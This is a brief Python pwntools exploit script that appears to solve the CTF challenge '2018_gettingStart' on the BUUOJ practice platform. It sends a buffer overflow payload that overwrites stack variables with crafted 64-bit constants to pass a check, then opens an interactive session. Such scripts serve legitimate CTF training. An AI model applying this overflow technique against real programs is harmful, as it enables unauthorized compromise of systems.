from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('2018_gettingStart')
io = remote('node4.buuoj.cn', 25561)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('2018_gettingStart')

payload = cyclic(0x18) + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
io.sendlineafter('But Whether it starts depends on you.\n', payload)
io.interactive()
